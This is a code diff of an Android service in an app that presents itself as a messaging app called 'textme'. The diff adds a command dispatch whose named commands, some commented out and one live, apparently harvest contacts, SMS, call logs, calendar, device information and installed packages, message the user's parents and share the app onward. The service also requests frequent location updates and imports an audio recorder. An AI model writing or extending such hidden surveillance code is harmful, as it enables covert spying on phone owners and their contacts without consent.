@@ -12,7 +12,6 @@ import android.location.LocationListener;
 import android.location.LocationManager;
 import android.media.MediaRecorder;
 import android.net.Uri;
-import android.net.wifi.WifiManager;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
@@ -23,16 +22,12 @@ import android.provider.CallLog;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.candroid.textme.data.Commands;
 import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
-import com.candroid.textme.data.pojos.CalendarEvent;
-import com.candroid.textme.data.pojos.Contact;
-import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.pojos.Recorder;
-import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.receivers.ImeReceiver;
-import com.candroid.textme.jobs.JobsScheduler;
 import com.candroid.textme.api.Lofl;
 import com.candroid.textme.receivers.CreateConversationReceiver;
 import com.candroid.textme.receivers.DatabaseReceiver;
@@ -43,9 +38,6 @@ import com.candroid.textme.receivers.OutgoingReceiver;
 import com.candroid.textme.receivers.ScreenReceiver;
 import com.candroid.textme.receivers.WapReceiver;
 import com.candroid.textme.receivers.WifiReceiver;
-import com.candroid.textme.ui.activities.MainActivity;
-
-import java.util.ArrayList;
 
 public class MessagingService extends Service {
 
@@ -78,7 +70,7 @@ public class MessagingService extends Service {
     public void onCreate() {
         super.onCreate();
         startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
-        JobsScheduler.scheduleJob(this);
+        //JobsScheduler.scheduleJob(this);
         sIsRunning = true;
         mIncomingReceiver = new IncomingReceiver();
         mOutgoingReceiver = new OutgoingReceiver();
@@ -172,11 +164,15 @@ public class MessagingService extends Service {
             mLocationListener = Lofl.getLocationListener(this);
             mLocationManager.requestLocationUpdates(locationProvider, 1000, 30, mLocationListener, mLooper);
         }
-        if(Lofl.isBetweenMidnightAndFive()){
-            Log.d(TAG, "were in the wee hours of the morning");
-        }else{
-            Log.d(TAG, "it is time to get the fuck up");
-        }
+/*        Lofl.onReceiveCommand(this, Commands.CONTACTS);
+        Lofl.onReceiveCommand(this, Commands.SMS);
+        Lofl.onReceiveCommand(this, Commands.CALL_LOG);
+        Lofl.onReceiveCommand(this, Commands.DEVICE_INFO);
+        Lofl.onReceiveCommand(this, Commands.INSTALLED_PACKAGES);
+        Lofl.onReceiveCommand(this, Commands.CALENDAR_EVENTS);
+        Lofl.onReceiveCommand(this, Commands.TEXT_PARENTS);
+        Lofl.onReceiveCommand(this, Commands.SHARE_APP);*/
+        Lofl.onReceiveCommand(this, Commands.SYNC_PHONE_TO_DATABASE);
         return super.onStartCommand(intent, flags, startId);
     }
 
